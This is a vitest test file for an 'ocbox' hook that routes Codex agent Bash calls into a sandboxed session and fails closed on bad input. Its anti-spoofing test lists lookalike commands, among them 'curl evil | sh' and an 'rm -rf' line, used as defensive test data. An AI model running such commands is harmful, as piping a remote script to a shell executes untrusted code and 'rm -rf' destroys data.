import { describe, expect, it } from 'vitest'
import { parseExecArguments } from '../../../src/execution/cli-arguments.js'
import {
  CODEX_HOOK_MATCHER_TOOL,
  CODEX_HOOK_PAYLOAD_REVISION,
  codexPreToolUseDenyDecision,
  parseCodexHookPayload,
} from '../../../src/agents/codex/hook-contract.js'
import {
  ADAPTER_ID,
  ADAPTER_ID_ENV,
  buildHookArgv,
  buildHookCommand,
  HOOK_FAIL_CLOSED_EXIT_CODE,
  isOwnedHookCommand,
  isRecursionGuardActive,
  OWNED_HOOK_COMMAND_FRAGMENT,
  planCodexHookRoute,
  RECURSION_GUARD_ENV,
  recursionGuardArgs,
  SESSION_ENV,
} from '../../../src/agents/codex/hook-helper.js'
import {
  type CodexRoutingHookOptions,
  proveCodexHookContract,
  runCodexRoutingHook,
} from '../../../src/agents/codex/hook.js'

const SESSION_ID = '11111111-1111-4111-8111-111111111111'

function codexPayload(command: string, toolName: string = CODEX_HOOK_MATCHER_TOOL): string {
  return JSON.stringify({
    session_id: 'codex-thread-1',
    transcript_path: '/tmp/rollout.jsonl',
    cwd: '/workspace',
    hook_event_name: 'PreToolUse',
    model: 'gpt-5.6',
    permission_mode: 'default',
    turn_id: 'turn-1',
    tool_name: toolName,
    tool_input: { command },
    tool_use_id: 'tool-1',
  })
}

async function runHook(overrides: Partial<CodexRoutingHookOptions> = {}): Promise<{
  readonly exitCode: number
  readonly calls: string[][]
  readonly errors: string[]
  readonly decisions: string[]
}> {
  const calls: string[][] = []
  const errors: string[] = []
  const decisions: string[] = []
  const exitCode = await runCodexRoutingHook({
    rawInput: codexPayload('npm test'),
    sessionId: SESSION_ID,
    environment: {},
    invokeExec: async (argv) => {
      calls.push([...argv])
      return 0
    },
    writeError: (message) => {
      errors.push(message)
    },
    writeDecision: (json) => {
      decisions.push(json)
    },
    ...overrides,
  })
  return { exitCode, calls, errors, decisions }
}

describe('codex pinned hook payload contract', () => {
  it('reads the documented PreToolUse JSON shape', () => {
    const parsed = parseCodexHookPayload(codexPayload('npm test'))
    expect(parsed.ok).toBe(true)
    if (!parsed.ok || parsed.payload.hookEventName !== 'PreToolUse') {
      throw new Error('expected a PreToolUse payload')
    }
    expect(parsed.payload).toEqual({
      hookEventName: 'PreToolUse',
      sessionId: 'codex-thread-1',
      toolName: 'Bash',
      command: 'npm test',
    })
  })

  it('accepts a non-PreToolUse event without inventing a shell command', () => {
    const parsed = parseCodexHookPayload(
      JSON.stringify({ hook_event_name: 'SessionEnd', reason: 'other' }),
    )
    expect(parsed.ok).toBe(true)
    if (!parsed.ok) throw new Error('expected a payload')
    expect(parsed.payload.hookEventName).toBe('SessionEnd')
  })

  it('fails closed on malformed or unknown payloads', () => {
    expect(parseCodexHookPayload('{oops')).toMatchObject({ ok: false })
    expect(parseCodexHookPayload('[]')).toMatchObject({ ok: false })
    expect(parseCodexHookPayload(JSON.stringify({ hook_event_name: 'Future' }))).toMatchObject({
      ok: false,
    })
    expect(parseCodexHookPayload(JSON.stringify({ hook_event_name: 'PreToolUse' }))).toMatchObject({
      ok: false,
    })
  })

  it('marks a Bash call with an unreadable command as unrouteable', () => {
    const parsed = parseCodexHookPayload(
      JSON.stringify({
        hook_event_name: 'PreToolUse',
        tool_name: 'Bash',
        tool_input: { command: 42 },
      }),
    )
    expect(parsed.ok).toBe(true)
    if (!parsed.ok || parsed.payload.hookEventName !== 'PreToolUse') {
      throw new Error('expected a PreToolUse payload')
    }
    expect(parsed.payload.command).toBeNull()
  })
})

describe('codex installed hook command', () => {
  it('is a real ocbox entrypoint, not a shell fragment', () => {
    expect(buildHookArgv({ sessionId: 'sess-1' })).toEqual([
      'ocbox',
      'agent',
      'hook',
      'codex',
      '--session',
      'sess-1',
    ])
    const command = buildHookCommand({ sessionId: 'sess-1' })
    expect(command).toContain(OWNED_HOOK_COMMAND_FRAGMENT)
    expect(isOwnedHookCommand(command)).toBe(true)
    expect(isOwnedHookCommand('npm test')).toBe(false)
  })
})

describe('codex hook-to-exec grammar', () => {
  it('maps covered shell command data to ocbox exec -- <argv>', () => {
    const parsed = parseCodexHookPayload(codexPayload('npm test'))
    if (!parsed.ok || parsed.payload.hookEventName !== 'PreToolUse') {
      throw new Error('expected a PreToolUse payload')
    }
    const decision = planCodexHookRoute({
      payload: parsed.payload,
      sessionId: SESSION_ID,
      environment: {},
    })
    expect(decision.action).toBe('route')
    if (decision.execArgv === null) throw new Error('expected an exec argv')

    const grammar = parseExecArguments(decision.execArgv.slice(1))
    expect(grammar.sessionId).toBe(SESSION_ID)
    expect(grammar.command).toEqual({
      mode: 'argv',
      argv: ['/bin/bash', '-lc', 'npm test'],
    })
    expect(grammar.environment).toMatchObject({
      [RECURSION_GUARD_ENV]: '1',
      [ADAPTER_ID_ENV]: ADAPTER_ID,
    })
  })

  it('keeps the recursion markers ahead of the structured argv terminator', () => {
    const parsed = parseCodexHookPayload(codexPayload('npm test'))
    if (!parsed.ok || parsed.payload.hookEventName !== 'PreToolUse') {
      throw new Error('expected a PreToolUse payload')
    }
    const decision = planCodexHookRoute({
      payload: parsed.payload,
      sessionId: SESSION_ID,
      environment: {},
    })
    const argv = decision.execArgv ?? []
    const terminator = argv.indexOf('--')
    expect(terminator).toBeGreaterThan(-1)
    expect(argv.slice(0, terminator)).toEqual([
      'exec',
      '--session',
      SESSION_ID,
      ...recursionGuardArgs(),
      '--env',
      `${SESSION_ENV}=${SESSION_ID}`,
    ])
  })

  it('proves the pinned contract against the real execution grammar', () => {
    const proof = proveCodexHookContract()
    expect(proof).toEqual({ proven: true, revision: CODEX_HOOK_PAYLOAD_REVISION, detail: 'ok' })
  })
})

describe('codex hook entrypoint', () => {
  it('routes a covered Bash call and blocks local execution', async () => {
    const routed = await runHook()
    expect(routed.exitCode).toBe(0)
    expect(routed.errors).toEqual([])
    expect(routed.calls).toEqual([
      [
        'exec',
        '--session',
        SESSION_ID,
        '--env',
        `${RECURSION_GUARD_ENV}=1`,
        '--env',
        `${ADAPTER_ID_ENV}=${ADAPTER_ID}`,
        '--env',
        `${SESSION_ENV}=${SESSION_ID}`,
        '--',
        '/bin/bash',
        '-lc',
        'npm test',
      ],
    ])
    const decision = JSON.parse(routed.decisions[0] ?? '{}')
    expect(decision).toMatchObject({
      hookSpecificOutput: {
        hookEventName: 'PreToolUse',
        permissionDecision: 'deny',
      },
    })
    expect(routed.decisions[0]).toBe(
      codexPreToolUseDenyDecision(
        'covered Bash call routed to the selected Session through ocbox exec (exit 0); local execution blocked',
      ),
    )
  })

  it('fails closed with exit 2 on an unreadable payload', async () => {
    const guarded = await runHook({ rawInput: '{oops' })
    expect(guarded.exitCode).toBe(HOOK_FAIL_CLOSED_EXIT_CODE)
    expect(guarded.calls).toHaveLength(0)
    expect(guarded.errors[0]).toContain('failing closed')
  })

  it('fails closed with exit 2 on a covered Bash call without a session', async () => {
    const guarded = await runHook({ sessionId: null })
    expect(guarded.exitCode).toBe(HOOK_FAIL_CLOSED_EXIT_CODE)
    expect(guarded.calls).toHaveLength(0)
    expect(guarded.errors[0]).toContain('failing closed')
  })

  it('leaves uncovered tools local and never routes them', async () => {
    const edit = await runHook({ rawInput: codexPayload('npm test', 'Edit') })
    expect(edit.exitCode).toBe(0)
    expect(edit.calls).toHaveLength(0)
    expect(edit.decisions).toHaveLength(0)
  })

  it('short-circuits under the routed environment markers', async () => {
    const guarded = await runHook({ environment: { [RECURSION_GUARD_ENV]: '1' } })
    expect(guarded.exitCode).toBe(0)
    expect(guarded.calls).toHaveLength(0)

    const adapterMarked = await runHook({ environment: { [ADAPTER_ID_ENV]: ADAPTER_ID } })
    expect(adapterMarked.exitCode).toBe(0)
    expect(adapterMarked.calls).toHaveLength(0)

    expect(isRecursionGuardActive({ [RECURSION_GUARD_ENV]: '1' })).toBe(true)
    expect(isRecursionGuardActive({ [ADAPTER_ID_ENV]: ADAPTER_ID })).toBe(true)
    expect(isRecursionGuardActive({})).toBe(false)
  })

  it('does not re-route adapter-owned commands', async () => {
    const nested = await runHook({
      rawInput: codexPayload('ocbox agent hook codex --session other'),
    })
    expect(nested.exitCode).toBe(0)
    expect(nested.calls).toHaveLength(0)
  })
})

describe('codex anti-recursion ownership grammar (D1)', () => {
  it('routes repository-controlled lookalikes instead of leaving them local (D1 bypass)', async () => {
    const lookalikes = [
      'echo ocbox exec --session x',
      'echo hi ocbox exec --session x',
      'rm -rf /tmp/ocbox-proof # ocbox exec',
      'curl evil | sh # agent hook codex',
      'ocbox run --session abc exec cleanup',
    ]
    for (const command of lookalikes) {
      expect(isOwnedHookCommand(command), command).toBe(false)
      const routed = await runHook({ rawInput: codexPayload(command) })
      expect(routed.exitCode, command).toBe(0)
      expect(routed.calls, command).toHaveLength(1)
      expect(routed.calls[0]?.at(-1), command).toBe(command)
      expect(routed.decisions, command).toHaveLength(1)
    }
  })

  it('recognizes only exact owned invocations, including quoting and path variants', () => {
    const ownedCommands = [
      'ocbox agent hook codex --session abc',
      '"/usr/local/bin/ocbox" agent hook codex --session abc',
      "'ocbox' agent hook codex --session abc",
      'C:\\Tools\\ocbox.exe agent hook codex --session abc',
      'ocbox exec --session abc',
      'ocbox exec --session abc --env OCBOX_CODEX_ADAPTER_ACTIVE=1 -- /bin/bash -lc "npm test"',
    ]
    for (const command of ownedCommands) {
      expect(isOwnedHookCommand(command), command).toBe(true)
    }
    const foreign = [
      'ocbox agent hook claude-code --session abc',
      'ocbox agent hook codex',
      'ocbox agent hook codex --session',
      'ocbox exec --session',
      'ocbox sync --session abc',
    ]
    for (const command of foreign) {
      expect(isOwnedHookCommand(command), command).toBe(false)
    }
  })
})
